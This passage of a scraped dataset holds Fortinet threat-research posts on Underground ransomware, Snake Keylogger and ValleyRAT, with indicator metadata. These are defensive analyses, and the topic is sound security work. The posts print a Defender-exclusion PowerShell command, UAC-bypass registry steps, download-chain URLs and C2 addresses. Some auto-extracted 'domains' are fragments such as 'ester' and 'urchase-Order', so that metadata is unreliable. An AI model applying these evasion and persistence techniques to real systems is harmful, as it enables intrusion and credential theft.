Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/emansrepo-stealer-multi-vector-attack-chains",
      "scraped_at": "2025-07-20T13:46:03.593422",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ester",
          "urchase-Order",
          "un",
          "reoffice"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "e346f6b36569d7b8c52a55403a6b78ae0ed15c0aaae4011490404bdb04ff28e5",
          "ae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://estanciaferreira"
        ]
      },
      "threat_score": 0.4248088360237894
    }
  },
  {
    "id": "Fortinet_32418",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Underground",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Underground ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The first sample of Underground ransomware was first observed in early July 2023, on a publicly available file scanning site. This roughly coincides with the timing of the first victim posted on its data leak site on July 13, 2023. Like most ransomware, this ransomware encrypts files on victims' Windows machines and demands a ransom to decrypt them via dropped ransom notes. Online reports indicate that the Russia-based RomCom group, also known as Storm-0978, is deploying the Underground ransomware. This threat group is known to exploit CVE-2023-36884 (Microsoft Office and Windows HTML RCE Vulnerability), which could be the infection vector for the ransomware. FortiGuard Labs published an Outbreak Alert on CVE-2023-36884 on July 13, 2024. The group may also use other common infection vectors such as email and purchasing access from an Initial Access Broker (IAB). Once executed, the Underground ransomware deletes shadow copies with the following command: The ransomware sets the maximum time that a RemoteDesktop/TerminalServer session can remain active on the server to 14 days (14 days after the user disconnects) using the following command: It then stops the MS SQL Server service with the following command: The ransomware then creates and drops a ransom note named “!!readme!!!.txt”: While the ransomware encrypts files, it does not change or append file extensions. It also avoids encrypting files with the following extensions: The ransomware creates and executes temp.cmd, which performs the following actions: The Underground ransomware has a data leak site that posts victim information, including data stolen from victims. Currently, the data leak site lists 16 victims, with the most recent victim posted on July 3, 2024. Below is a breakdown of the victims and their verticals: Location of Victim Construction Pharmaceuticals Professional Services Business Services Construction Manufacturing Manufacturing Manufacturing Business Services Manufacturing Manufacturing The data leak site also includes a drop-down box with a list of industries that the ransomware group is targeting or is allowed to target. The Underground ransomware group also has a Telegram channel that was created on March 21, 2024. According to the Telegram channel, the ransomware group has made victims' stolen information available on Mega, a cloud storage service provider that is being abused. The Underground ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Please read the outbreak alert for protection against the potential infection vector (CVE-2023-36884) abused by the Underground ransomware: Underground Ransomware File IOCs 9543f71d7c4e394223c9d41ccef71541e1f1eb0cc76e8fa0f632b8365069af64 Underground ransomware 9f702b94a86558df87de316611d9f1bfe99a6d8da9fa9b3d7bb125a12f9ad11f eb8ed3b94fa978b27a02754d4f41ffc95ed95b9e62afb492015d0eb25f89956f 9d41b2f7c07110fb855c62b5e7e330a597860916599e73dd3505694fd1bbe163 cc80c74a3592374341324d607d877dcf564d326a1354f3f2a4af58030e716813 d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-underground",
      "scraped_at": "2025-07-20T13:46:10.704230",
      "indicators": {
        "ip_address": [],
        "domain": [
          "emp"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "9f702b94a86558df87de316611d9f1bfe99a6d8da9fa9b3d7bb125a12f9ad11f",
          "9d41b2f7c07110fb855c62b5e7e330a597860916599e73dd3505694fd1bbe163",
          "d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666",
          "eb8ed3b94fa978b27a02754d4f41ffc95ed95b9e62afb492015d0eb25f89956f",
          "9543f71d7c4e394223c9d41ccef71541e1f1eb0cc76e8fa0f632b8365069af64",
          "cc80c74a3592374341324d607d877dcf564d326a1354f3f2a4af58030e716813"
        ],
        "cve": [
          "CVE-2023-36884"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.6106870229007634
    }
  },
  {
    "id": "Fortinet_58856",
    "source": "Fortinet",
    "title": "Deep Analysis of Snake Keylogger’s New Variant",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from the victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently caught a phishing campaign in the wild with a malicious Excel document attached to the phishing email. We performed a deep analysis on the campaign and discovered that it delivers a new variant of Snake Keylogger. Snake Keylogger (aka “404 Keylogger” or “KrakenKeylogger”) is a subscription-based keylogger with many capabilities. It is a . NET-based software originally sold on a hacker forum. Once executed on a victim’s computer, it has the ability to steal sensitive data, including saved credentials from web browsers and other popular software, the system clipboard, and basic device information. It can also log keystrokes and capture screenshots. In the following sections, we will look at the phishing spam, how it lures the recipient into opening a malicious Excel document, how the Excel document downloads and executes a new variant of Snake Keylogger, and what anti-analysis techniques it uses to protect itself from being detected and blocked during the attack. The email content in Figure 1 attempts to deceive the recipient into opening the attached Excel file (swift copy.xls) by claiming that funds have been transferred into their account. To warn the user, the FortiGuard service marks this phishing email as “[virus detected],” as shown in the subject line. Figure 2 shows the content of the attached Excel file when opened in the Office Excel program. Meanwhile, malicious code is executed in the background to download other files. Looking into the binary data of the Excel file, it contains a specially crafted embedded link object that exploits theCVE-2017-0199vulnerability to download a malicious file. Figure 3 displays the embedded link object (“\\x01Ole”). The link is “hxxp[:]//urlty[.]co/byPCO,” which is secretly requested by the Excel program when the file is opened. When the link is accessed, it returns with another URL in the “Location” field of the response header, which is “hxxp[:]//192.3.176[.]138/xampp/zoom/107.hta”. HTA file is an HTML Application file executed by a Windows application— by default, the HTML Application host (mshta.exe). The 107.hta file is full of obfuscated JavaScript code that is executed automatically when loaded by mshta.exe. Figure 4 shows a partial view of the JavaScript code. After decoding and de-obfuscating the JavaScript code, we were able to get a piece of the VBScript code, as shown in Figure 5. It’s evident that the VBScript code created an object of “Script. Shell” and executed a piece of PowerShell code decoded from a base64 string, defined in the variable “ps_code”. This PowerShell code is then executed by “cmd.exe” (%ComSpec%) when the “shellObj. Run()” function is called. The base64 decoded PowerShell code is shown below. It invokes a Windows API, URLDownloadToFile(), to download an executable file to the victim’s computer and run it after waiting three seconds. The URL of the executable file is hardcoded as “hxxp[:]//192.3.176[.]138/107/sahost.exe” and the local file is “%Appdata%\\sahost.exe”. The PowerShell code finally starts the executable file by callingStart “$Env:AppData\\sahost.exe”. My research shows that the downloaded EXE file (sahost.exe) contains a new variant of Snake Keylogger, which is extracted, decrypted, loaded, and run by the EXE file. I will refer to this downloaded EXE file as the Loader module. Figure 6 is a screenshot of its analysis in a packer detection tool. It was developed using the Microsoft . Net Framework. To protect the Snake Keylogger core module from being detected and blocked by cybersecurity products, sahost.exe uses multiple-layer protection techniques, like transformation and encryption, within several named resources. When sahost.exe starts, it extracts several modules (dlls) onto its memory from the Resource section that provide methods to inquire, extract, decrypt, install, and deploy the core module. The original name of “sahost.exe” is “utGw.exe.” It decrypts and extracts a module called “FGMaker.dll” from a resource named “siri” in its Resource section. Figure 7 shows some of that code. The “FGMaker.dll” module extracts additional modules (such as “Q” and “Gammar.dll”) that work together to extract and decrypt a module called “Tyrone.dll” from the resource “KKki”. You may have noticed in Figure 8 that it loads “KKki” as a Bitmap resource. The module “Tyrone.dll” was encrypted, broken down into bytes, and kept in the Bitmap resource. Figure 9 shows the content of the resource “KKki” as a Bitmap picture. After another decryption sequence, we can see the plaintext of the “Tyrone.dll” module in memory. It is then loaded as an executable module by calling the Assembly. Load() method. Figure 10 showcases the modules that have been extracted and loaded by the Loader module so far. I will refer to “Tyrone.dll” as “Deploy module” in the following analysis. It performs the following functions: This checks whether the current process’s full path is \"% AppData%WeENKtk.exe,\" renames it, and sets attributes (Hidden, ReadOnly, System, etc.) to it if the result is no. On the very first run, it was %AppData%sahost. exe. The Deploy module runs the “schetasks.exe” command to create a new scheduled task in the system Task Scheduler. This allows Snake Keylogger to launch at system startup. Figure 11 shows the scheduled task for Snake Keylogger. The Deploy module obtains a resource data, “I7O14IyvsdO,” from its own Resource section. Then, it decrypts the data with the string key “YRDdITlYRXI” into a final PE file in its memory. This is the core module of Snake Keylogger. Next, the Deploy module performs process hollowing, a malware technique that creates a new process and then inserts malicious code into it to run. This allows it to hide its original process. Figure 12 shows that it about to call the obfuscated API CreateProcess(). It has a key argument, “Creation Flag,” indicating how to create the process. Its value has been set to 134217732, i.e. 0x08000004 in hexadecimal. It is defined as “CREATE_SUSPENDED” and “CREATE_NO_WINDOW.” The process name, the first argument to CreateProcess(), is the same as the Loader module. To complete the process hollowing, it needs to call some relevant Windows APIs, such as ZwUnmapViewOfSection(), VirtualAllocEx(), ReadProcessMemory(), WriteProcessMemory(), GetThreadContext(), SetThreadContext(), and ResumeThread(). The core module's original name is “lfwhUWZlmFnGhDYPudAJ.exe.” Figure 13 shows that the attacker has fully obfuscated the entire module, which displays its entry point (“Main()”) and the obfuscated code, class names, and method names. The Snake Keylogger's structure is very clear. We can see its capability to collect private and sensitive information from the victim’s device, including the device’s basic information, saved credentials, keystrokes, screenshots, and data on the system clipboard. The features are split into different methods driven by Timers. Snake Keylogger also has some relevant flag variables indicating whether the feature is enabled. This variant of Snake Keylogger only enables the credential collection feature. First, Snake Keylogger fetches the device’s basic information, like the PC name, System time, IP address, Country name, Region name, City name, TimeZone, and so on. Figure 14 shows an example of the basic information collected from one of my testing devices. This Snake Keylogger variant includes several hardcoded IP addresses the attacker may believe are used by some sample automatic analysis systems they want to avoid. One method called “anti_bot(),” shown in Figure 15, checks the hardcoded IP addresses. “BotDetected” is returned if the victim’s IP address matches any of those IP addresses. This results in the Snake Keylogger only collecting credentials but never sending them to the attacker. Snake Keylogger collects saved credentials from over 50 popular software programs, categorized as web browsers, email clients, IM clients, and FTP clients. Every software has its own profile folder for saving configuration data. Snake Keylogger traverses all the profile files, looking for the saved credentials. Figure 16 is an example of the method used for Google Chrome. As you may have noticed in the “Locals” tab, it just obtained one set of credentials, including “URL,” “Login ID,” and “Login Password.” All the software can be categorized as follows: Chromium-based Web Browsers:\"Google Chrome,\" \"Amigo,\" \"Xpom,\" \"Kometa,\" \"Nichrome,\" \"CocCoc,\" \"QQ Browser,\" \"Orbitum,\" \"Slimjet,\" \"Iridium,\" \"Vivaldi,\" \"Iron,\" \"Chromium,\" \"Ghost Browser,\" \"Cent Browser,\" \"xVast,\" \"Chedot,\" \"Comodo Dragon,\" \"SuperBird,\" \"360 Browser,” \"360 Chrome,” \"Brave,\" \"Torch,\" \"UC Browser,\" \"Blisk,\" \"Epic PrivacyBrowser,\" \"Liebao,\" \"Avast,\" \"Kinza,\" \"BlackHawk,\" \"Citrio,\" \"Uran,\" \"Coowon,\" \"7Star,” \"QIP Surf,” \"Sleipnir,” \"Chrome Canary,” \"ChromePlus,” \"Sputnik,” \"Microsoft Edge,\" and \"Slim\". Mozilla-based Web Browsers:\"SeaMonkey,” \"IceDragon,” \"CyberFox,” \"WaterFox,” \"Postbox,” and \"PaleMoon\" Other Web Browsers:\"Opera,” \"Firefox\". Email clients:\"FoxMail,” \"Thunderbird\". FTP clients:\"FileZilla\". IM client:\"Pidgin,” \"Discord\". All the credentials collected from the above software are temporarily stored in a global variable. Snake Keylogger variants have several ways to submit harvested credentials to the attacker, including uploading the data onto an FTP server, sending it to an email address, and submitting it over Telegram’s bot over HTTP Post method. This variant of Snake Keylogger sends data over SMTP. Figure 17 is a screenshot of how it builds the email content. The upper part contains the code that includes the email’s sender, recipient, subject, and body, while the lower part shows the content of the variable “mailMessage” with the data filled by the code. The email’s body contains the computer's basic information saved in a global variable, followed by the credentials stolen from the victim’s computer saved in another global variable. It then creates an SMTP client, and its Send() method is called to send the credentials to the attacker. Figure 18 shows an example of how the email looks in Microsoft Outlook. Figure 19 illustrates the entire workflow of the Snake Keylogger campaign. This analysis reviewed the entire process of this Snake Keylogger campaign, which is being led by a phishing email. The phishing email, which included a malicious Excel document, lured the recipient into opening the file to see the details of a “balance payment.” The Excel document was displayed in different tools, and I explained how it downloads an HTA file by exploiting a known vulnerability. It then leverages multiple language scripts, such as JavaScript, VBScript, and PowerShell, to download the Snake Keylogger’s Loader module. Afterward, I elaborated on how the Loader module extracts multiple modules (including several middle modules and the Deploy module) from the file’s Resource section. Malware often uses a process like this to prevent being detected and analyzed. Next, I introduced how the Snake Keylogger Deploy module establishes persistence on the victim’s computer and conducts process hollowing to put the core module into a newly created process to run. Finally, we examined how the Snake Keylogger steals sensitive information from the victim’s computer and how the stolen data is sent to the attacker using the SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-0199 with the signature “MS. Office. OLE.autolink. Code. Execution”. FortiGuard Antivirus service detects the attached Excel document, 107.hta, the downloaded executable file and the extracted Snake Keylogger with the following AV signatures. MSExcel/CVE_2017_0199. DDOC!exploitVBS/SnakeKeylogger.119B!tr.dldrMSIL/SnakeKeylogger. FQQD!trMSIL/SnakeKeylogger. AES!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeFortinet Cybersecurity Fundamentals (FCF) training, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://urlty[.]co/byPCOhxxp[:]//192.3.176[.]138/xampp/zoom/107.htahxxp[:]//192.3.176[.]138/107/sahost.exe [swift copy.xls]8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7 [107.hta]6F6A660CE89F6EA5BBE532921DDC4AA17BCD3F2524AA2461D4BE265C9E7328B9 [The Loader module/sahost.exe / WeENKtk.exe / utGw.exe]484E5A871AD69D6B214A31A3B7F8CFCED71BA7A07E62205A90515F350CC0F723 [Snake Keylogger core module / lfwhUWZlmFnGhDYPudAJ.exe]207DD751868995754F8C1223C08F28633B47629F78FAAF70A3B931459EE60714 FortiGuards Labs,limitless keylogger,keylogger FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/deep-analysis-of-snake-keylogger-new-variant",
      "scraped_at": "2025-07-20T13:46:18.334176",
      "indicators": {
        "ip_address": [],
        "domain": [
          "eENKtk",
          "opy",
          "ahost",
          "GMaker",
          "shta",
          "chetasks",
          "LE",
          "yrone",
          "ammar",
          "fwhUWZlmFnGhDYPudAJ",
          "md",
          "r",
          "07",
          "tGw"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "484E5A871AD69D6B214A31A3B7F8CFCED71BA7A07E62205A90515F350CC0F723",
          "8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7",
          "207DD751868995754F8C1223C08F28633B47629F78FAAF70A3B931459EE60714",
          "6F6A660CE89F6EA5BBE532921DDC4AA17BCD3F2524AA2461D4BE265C9E7328B9"
        ],
        "cve": [
          "CVE-2017-0199"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.35446829755366943
    }
  },
  {
    "id": "Fortinet_40901",
    "source": "Fortinet",
    "title": "A Deep Dive into a New ValleyRAT Campaign Targeting Chinese Speakers",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium FortiGuard Labs recently encountered an ongoing ValleyRAT campaign specifically targeting Chinese speakers. This malware has historically targeted e-commerce, finance, sales, and management enterprises. ValleyRAT is a multi-stage malware that utilizes diverse techniques to monitor and control its victims and deploy arbitrary plugins to cause further damage. Another noteworthy characteristic of this malware is its heavy usage of shellcode to execute its many components directly in memory, significantly reducing its file footprint in the victim’s system. This blog provides a technical analysis of this campaign. This malware uses icons of legitimate applications, including Microsoft Office, with filenames related to financial documents similar to the following: To make the lure more believable to the user, it creates an empty file%TEMP%\\dome.docand executes the default application for opening Microsoft Office Word documents. If no default application is set, it shows an error message box with the text, “Open The Document Fail.” Upon execution, it attempts to create a mutex namedTESTto ensure that only one instance of the malware process is running on the system. After that, it deletes the following registry entries, which could have been added in a previous installation of the malware: It then stores the IP and the port of the Command and Control (C2) in the following registry entry: IpDateInfo = “|i:154.82.85.12|p:5689|” Before continuing, it determines if it’s running under a virtual machine by enumerating all services and checking if any of the following VM-related strings are on the service display names: If any of these services are found, a blank error message box is shown before it terminates. Before the shellcode is executed to load the next stage, this malware uses a known technique called sleep obfuscation to evade memory scanners. This involves adding a callback functionality to Sleep or similar APIs that modify the permissions of the allocated memory where the malicious code resides to values not commonly deemed suspicious by scanners. Furthermore, during this process, the malicious shellcode is encoded with a simple XOR operation to evade pattern-based signatures. After decoding the malicious shellcode using XOR with a single-byte key,0x60in this case, it copies the first 0xc bytes from the Sleep API function and stores it for later use. It then replaces it with code that will lead to executing the malicious callback function. This callback function changes the permission of the malicious shellcode and attempts to obfuscate it using the following procedure: In general, this malware uses shellcode blocks to run its components directly in memory. This shellcode is similar to the one shared in this GitHub repository:https://github.com/killeven/DllToShellCode/blob/master/DllToShellCode/shellcode_data.c. This specific shellcode has also been seen in older malware campaigns and detected by Fortinet as W64/Agent. CCF!tr. Once this malware has finished initializing, it decrypts a shellcode with the AES-256 algorithm using a key derived from a hardcoded 16-byte value. The result is then XOR-ed with0x60to reveal the final shellcode. It then triggers the previously mentioned sleep obfuscation routine by calling the Sleep API before finally executing the shellcode by using it as a callback procedure for theEnumSystemLocalesAAPI. The shellcode uses a hashing algorithm called BKDR to obfuscate the API names, which are then used to search for the target APIs by directly traversing the Process Environment Block (PEB). After checking standard 64-bit PE characteristics from the payload, the shellcode reflectively loads the embedded DLL, in this case, the beaconing module, by copying it to another memory location, adjusting its base relocation, and manually resolving its imports before its entry point is executed. The beaconing module is responsible for loading the RuntimeBroker and RemoteShellcode components. It also allows the malware to persist and gain administrator privileges in the system while ensuring that no AV-related processes are running before it starts communicating with its C2 server. This malware adds a scheduled task to allow its component,Loader- discussed in a later section – to execute automatically upon user login. Furthermore, for theLoadercomponent to be executed with high privilege without triggering Windows’ UAC, it employs a known technique that abuses the auto-elevate properties of the legitimate applications,C:\\Windows\\System32\\zh-CN\\eventvwr.mscorC:\\Windows\\System32\\CompMgmtLauncher.exe. By design, these applications eventually lead to the execution of the current default value set on the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Command, which will be set to the path of theLoadercomponent in a later stage of infection. It attempts to evade detection from Microsoft Windows Defender by adding the root drive of the malware path to the exclusion by executing the following PowerShell command: Invoke-Command -Command {Add-MpPreference -ExclusionPath {drive} Instead of usually running the command as an argument to the PowerShell process, it uses pipes to communicate with a newly created PowerShell process to execute commands. This could be an attempt to evade AV products that inspect suspicious process arguments. By default, it adds the common root drive \"C:\\\" to the list of excluded paths. If the malware was executed from another root drive, it will also be added to the list. It then proceeds to kill AV-related processes containing the following executable filenames: Notably, the executable names listed are components of products developed by Chinese companies reaffirming their target preference. To determine if the processes have been successfully terminated, it does another scan of the running processes to check if any process with the following executable filenames is still running: If any of these processes are still running, it performs another attempt to kill them by injecting a shellcode with an embedded DLL into a runninglsassprocess. This DLL performs the following procedures: Once the AV processes are no longer running, it modifies the following AV product settings in the registry to disable their autostart and/or reduce their effectiveness: If the AV programs are still found running, the malware process displays an “ERROR” message box and terminates. If the user has administrator privileges, it attempts to execute a new process of itself with elevated privileges without prompting Windows’ UAC(User Access Control) security feature using two known methods. The first method involves abusing the CMSTPLUA COM class, specifically theShellExecmethod of the ICMLuaUtil interface. Since the system automatically grants this class elevated privileges, any process executed using this interface will gain the same. Before using the interface to execute a new process of itself, it attempts to disguise itself as a legitimate explorer.exe process by locating the ProcessParameters structure in the Process Environment Block (PEB) and replacing its ImagePathName and CommandLine fields with the path of the legitimate explorer.exe. The second method exploits another legitimate application called fodhelper.exe. Like the first method, this executable gets high privilege upon execution. First, it creates the registry keyHKCU\\Software\\Classes\\.pwn\\Shell\\Open\\commandand sets its default value to the malware path. Next, it creates another registry key, HKCU\\Software\\Classes\\ms-settings\\CurVer, and sets its default value data to .pwn, associating it with the previously created malicious registry entry. Finally, it executes the legitimate fodhelper.exe, which executes whatever ProgID is defined in the CurVer subkey. This leads to the execution of the malware with high privilege. At this stage, the malware initiates its communication with its C2 to request other components needed for the next stages of the infection. Prior to this, it checks for internet connectivity by attempting to connect to the legitimate Chinese search engine,http://www.baidu.com. The requests sent by this malware at this stage are all in plaintext, but the responses from the C2 are encoded with a randomly generated single-byte XOR key, except for the requests to get the component sizes. This key is included in the malware’s requests in the format{request}_{xor key}. There are three possible configurations with the malware request methods to the C2 and its corresponding procedure for storing and executing succeeding components in the system. In the specific sample we analyzed, it is configured to request two shellcode blocks from its C2: internally namedRemoteShellcodeandRuntimeBroker. To do this, it determines the sizes of the shellcode blocks by sendingGetRemoteShellcodeSize_{xor key}andGetRuntimeBrokerSize_{xor_key}. The sizes received from the C2 are used to check the integrity of the shellcode upon receipt. After that, the C2 sends the shellcode encoded with the XOR key included in the malware’s requests. A traffic example is provided in the image below: RemoteShellCodeandRuntimeBrokerare decoded and injected into newly created processes of legitimate Windows applications C:\\Windows\\System32\\colorcpl.exe and C:\\Windows\\System32\\cleanmgr.exe, respectively. The functions for these components are detailed in the next sections. Meanwhile, the second method is like the first in that they both request two components from the C2—this time, they arewwlib.dll andWinword.exe. While the previous method’s execution of the components takes place in-memory, this method involves writing the components to the disk. Like the previous method, it also requests the sizes of the components. For the size ofwwlib.dll, it sendsGetWwlibSize_{xor key}. Although the sample we analyzed does not contain the request string for retrieving the size ofWinword.exe,extrapolating from the analysis of the first method, it can be assumed that it could sendGetWinWordSize_{xor key}beforehand. After the sizes have been determined, it sendsGetWWlib_{xor key}andGetWinWord_ {xor key}to receive the binaries, which are then written to the%UserProfile%directory. It then executesWinword.exe. Based on other reports,Winword.exeis a legitimate Microsoft Office Word executable, which would then be executed, inadvertently loading the maliciouswwlib.dllupon execution. Finally, the last method sendsGetOnline_{xor key}to download an executable file, which is then saved asalgbg.exein the%UserProfile%directory. It could sendGetOnlineSize_{xor key}to get the executable size beforehand. This shellcode loads and executes a DLL whose primary purpose is downloading a component namedLoaderfrom the C2 server. The DLL sends the request stringsGetLoaderSize_{xor key}andGetLoader_{xor key}to the C2, which responds with the size and the requested executable file, respectively. This file is then saved asLoader.exein the%USERPROFILE%directory. After dropping the executable file, it sets the default value of the registry entryHKEY_CURRENT_USER\\Software\\Classes\\mscfile\\Shell\\Open\\Commandto the said file path. This is to complete the autostart mechanism partially set up by the beaconing module mentioned earlier. This effectively allows the newLoadercomponent to run automatically when the user logs in. At the time of analysis, theLoadercomponent received from the C2 has the same function as the first-stage loader, which is to execute the beaconing module. We can see in the figure below that the WinMain of the first-stageLoaderis very similar to theWinMainof the newerLoaderexecutable from the C2. Fortinet detects these variants asW64/RCShell. A!tr. Setting aside the striking similarities, this new component has a few behaviors outside the first-stage loader, as detailed below. It attempts to detect if it is running inside a sandbox system by counting the files inside the%TEMP%directory. This malware terminates if the number of temporary files is less than 30. Since these systems are restored after every test, they usually have fewer temporary files than conventional systems. To continue execution, it makes sure that any of the following registry keys related to popular communication applications in China are found in the system, further confirming our belief that this malware specifically targets Chinese systems: While the first-stage loader uses the AES-256 algorithm to encrypt the shellcode, an interesting method this malware uses in other samples is to disguise the payload within the malware body by keeping them as UUID strings or IP addresses and then converting these benign-looking strings into their hex-byte equivalent to form the shellcode. The primary purpose of this component is to request the downloader of the ValleyRAT payload. In addition, it contains the embedded configuration marked with the string “codemark” for the payload to use during its execution at a later stage. This configuration is very similar to the previously reported ValleyRat campaigns, where it contains the latest C2 servers as well as other settings for the RAT. To request the payload downloader, it sends the string 64 or 32, depending on the system’s architecture. As shown in the image below, the C2 responds with the payload downloader encoded with XOR, where the key is derived by adding 0x36 to a 10-byte value from the C2's response. Similar to how the earlier components are loaded, the shellcode reflectively loads the embedded payloader DLL and executes its export namedloadwhile passing the previously mentioned configuration as an argument. We detect this component asW64/ValleyRat. A!tr.spy. The C2 configuration from the previous module is decoded by simple string reverse, which is then parsed to configure the downloader. Depending on the configuration, it uses UDP or TCP sockets to connect to the C2 and receive the final payload. First, it will send the size and the key for encrypting the payload, to which the C2 responds with the encoded SHA256 hash of the payload. Lastly, it sends登录模块.dll_bin(translated asLogin module.dll_bin) to request the ValleyRAT malware. A shellcode with the embedded ValleyRAT DLL is then decoded using the same method used to decode the payload downloader. This shellcode is stored in the registry valued33f351a4aeea5e608853d1a56661059on keyHKEY_CURRENT_USER\\Console\\1. Upon execution of the shellcode, the ValleyRAT DLL is reflectively loaded and executed in the system. This relatively new RAT is attributed to the suspected APT group “Silver Fox”. This malware's capabilities are focused on graphically monitoring the user's activities and delivering other plugins and possibly other malware to the victim system. These are the commands supported by this variant: In this article, we have detailed an elaborate and ongoing ValleyRAT campaign specifically targeting Chinese systems. This malware involves several components loaded in different stages and mainly uses shellcode to execute them directly in memory, significantly reducing its file trace in the system. Once the malware gains a foothold in the system, it supports commands capable of monitoring the victim's activities and delivering arbitrary plugins to further the threat actors’ intentions. FortiGuard Labs will continue to monitor this ongoing campaign. FortiGuard AntiVirus detects the malicious files identified in this report as The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. FortiEDR detects the malicious event and is detected by the “Unmapped Executable” rule within the “Exfiltration Prevention” security policy. The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date. We also suggest that organizations have their end users undergo our free NSE training:NSE 1 – Information Security Awareness. It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 154[.]82[.]85[.]12154[.]92[.]19[.]81 